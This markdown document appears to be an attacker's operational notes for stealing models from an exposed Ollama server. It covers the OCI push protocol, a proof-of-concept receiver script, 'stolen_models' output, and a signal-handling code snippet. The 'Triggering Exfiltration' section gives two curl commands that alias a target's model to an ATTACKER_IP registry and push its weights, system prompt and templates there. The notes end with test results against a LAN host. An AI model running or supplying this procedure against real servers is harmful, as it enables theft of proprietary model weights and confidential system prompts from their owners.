# Model Exfiltration Server (Chain G1)

## OCI Push Protocol

When Ollama pushes a model to a registry, it implements the OCI Distribution Spec upload flow:

1. **HEAD /v2/{repo}/blobs/{digest}** — Check if blob exists. If 404, triggers upload.
2. **POST /v2/{repo}/blobs/uploads/** — Start upload session. Returns 202 with `Location: .../uploads/{uuid}`.
3. **PATCH /v2/{repo}/blobs/uploads/{uuid}** — Upload blob data chunk. Returns 202 with `Range: 0-{n}`.
4. **PUT /v2/{repo}/blobs/uploads/{uuid}?digest=sha256:...** — Finalize upload. Computes digest, stores blob. Returns 201.
5. **PUT /v2/{repo}/manifests/{tag}** — Store manifest JSON. Returns 201.

## Path Parsing

Ollama constructs registry paths as `/v2/{org}/{repo}/blobs/...` or `/v2/{repo}/blobs/...`. The repo portion can contain slashes. Always strip query strings before parsing paths.

**Gotcha:** `self.path` in Python's `BaseHTTPRequestHandler` includes the query string. Always do `self.path.split("?")[0]` before splitting by `/`.

## Exfiltration Server

`scripts/poc_exfil_server.py` implements the complete receiver:

```bash
python3 poc_exfil_server.py --port 8080 --output ./stolen_models
```

Features:
- Full OCI push protocol (HEAD/POST/PATCH/PUT)
- Auto-detects content types: GGUF weights (`.gguf`), config JSON, system prompts (`.txt`), Jinja2 templates (`.jinja2`)
- Health check at `GET /` showing received blobs and manifests
- Saves to disk on Ctrl+C or SIGTERM with summary

## Signal Handling for Graceful Shutdown

Python's `HTTPServer.serve_forever()` does NOT respond reliably to `server.shutdown()` called from a signal handler. The main thread is blocked in `accept()` and the signal may not interrupt it.

**Working pattern:** Register a signal handler that saves data and calls `os._exit(0)`:

```python
import signal, os

def handle_signal(signum, frame):
    saved = save_exfiltrated(args.output, ExfilHandler.blobs, ExfilHandler.manifests)
    if saved:
        print(f"[+] Saved {len(saved)} files to {args.output}/:")
        for kind, path, size in saved:
            print(f"    {kind:20s} {size:>12d} B  {os.path.basename(path)}")
    os._exit(0)

signal.signal(signal.SIGTERM, handle_signal)
signal.signal(signal.SIGINT, handle_signal)
server.serve_forever()
```

**Important:** When killing the server process, make sure you kill the actual Python process, NOT the shell wrapper. When started via `terminal(background=True)`, the PID returned is the shell script's PID, not the Python child. Use `ps aux | grep poc_exfil_server` to find the actual Python PID, or use `pkill -f "poc_exfil_server"`.

**Class variable isolation across processes:** `ExfilHandler.blobs` and `ExfilHandler.manifests` are class variables shared within a single Python process. Starting a new server process (even on the same port after killing the old one) creates fresh empty class variables. Data received by the old process is lost when that process dies — it does NOT carry over to the new process. Always ensure the server process that received the data is the one that saves it.

**Port conflicts from orphaned processes:** Old server processes that weren't properly killed can hold ports. Always check `ss -tlnp | grep <port>` before starting a new server. Use `fuser -k <port>/tcp` to kill whatever is holding a port.

## Triggering Exfiltration

```bash
# Step 1: Create alias pointing to attacker server
curl -X POST http://target:11434/api/copy \
  -d '{"source":"smollm2:135m","destination":"ATTACKER_IP:8080/stolen/smollm2:latest"}'

# Step 2: Push all blobs to attacker server
curl -X POST http://target:11434/api/push \
  -d '{"model":"ATTACKER_IP:8080/stolen/smollm2:latest","insecure":true}'
```

## What Gets Exfiltrated

For smollm2:135m (Ollama v0.24.0):
- GGUF model weights (~258 MB) — the full model file
- System prompt (~68 B) — confidential instructions
- Chat template (~675 B) — Jinja2 format
- License (~11 KB) — Apache 2.0
- Parameters (~59 B) — stop tokens
- Config JSON (~561 B) — architecture, family, quantization

## Confirmed Test Results (2026-05-20)

Tested end-to-end against Ollama v0.24.0 at 192.168.0.17:11434:
- Server: `poc_exfil_server.py` on port 7776
- Target model: smollm2:135m (258MB, freshly pulled)
- Result: All 6 blobs + 1 manifest received and saved correctly
- GGUF magic bytes (`GGUF`) confirmed in saved model weights file
- Total exfiltrated: ~258MB across 7 files
